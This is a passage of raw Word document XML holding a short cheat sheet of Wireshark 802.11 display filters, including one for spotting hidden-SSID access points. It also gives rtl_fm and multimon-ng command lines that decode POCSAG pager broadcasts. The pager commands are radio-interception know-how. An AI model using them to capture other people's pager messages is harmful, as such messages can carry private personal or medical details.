          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> display filter references. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF91873" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Show only the 802.11-based traffic: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D0E3A75" w14:textId="6ACC1641" w:rsidR="00F573A9" w:rsidRPr="00775D5B" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00775D5B">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="12C731DB" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Show only the 802.11-based traffic to and from 802.11 MAC address 08:00:08:15:ca</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>:fe</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B045CA1" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRPr="00775D5B" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00775D5B">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.addr</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00775D5B">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>==08.00.08.15.ca.fe </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D183A4" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Hide beacon frames: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D464626" w14:textId="77777777" w:rsidR="00F573A9" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> != 0x08</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="716A8122" w14:textId="77777777" w:rsidR="00781C97" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Show management frames for a specific SSID: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="501F464B" w14:textId="1DE8EB71" w:rsidR="00F573A9" w:rsidRPr="00781C97" w:rsidRDefault="00F573A9" w:rsidP="00F573A9">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>_mgt.ssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00781C97">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>== "Spatula City"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13F148DD" w14:textId="22D75821" w:rsidR="003D0165" w:rsidRPr="00781C97" w:rsidRDefault="003D0165" w:rsidP="003D0165">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00781C97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>Access Points wi</w:t>
      </w:r>
      <w:r w:rsidR="00781C97">
        <w:rPr>
          <w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>th ‘cloaked’ or ‘hidden’ SSIDs</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24A70285" w14:textId="73D5E32E" w:rsidR="003D0165" w:rsidRPr="003D0165" w:rsidRDefault="003D0165" w:rsidP="003D0165">
      <w:pPr>
        <w:pStyle w:val="NormalWeb"/>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.bssid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>==</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>xx:xx:xx:xx:xx:xx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>wlan.fc.type_subtype</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="003D0165">
        <w:rPr>
          <w:rFonts w:ascii="Menlo Regular" w:hAnsi="Menlo Regular" w:cs="Menlo Regular"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:eastAsia="ja-JP"/>
        </w:rPr>
        <w:t>==0</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Lucida Console" w:hAnsi="Lucida Console"/>
          <w:color w:val="CC0000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="607878C3" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Pocsag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> decoding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08BDBAB8" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="00540687" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -N -o 4 -A </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>lut</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -s 22050 -C -f 153.350M - | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -t raw -a POCSAG512 -a POCSAG1200 -a POCSAG2400 -f alpha /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>dev</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>stdin</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="71B0CB34" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="007669BD" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="007669BD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Pocsag</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="007669BD">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve"> play</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26708A18" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="00540687" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f 153.350M | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aplay</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00540687">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -r 24k -f S16_LE -t raw -c 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="466E8C77" w14:textId="77777777" w:rsidR="00C14F90" w:rsidRPr="005007BA" w:rsidRDefault="00C14F90" w:rsidP="00C14F90">
      <w:pPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>rtl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>_fm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -f 153.353e6 -g 100 -s 22050 -l 310 – | </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t>multimon-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
        </w:rPr>
        <w:t xml:space="preserve"> -t raw -a POCSAG1200 -f alpha /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005007BA">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Times New Roman" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
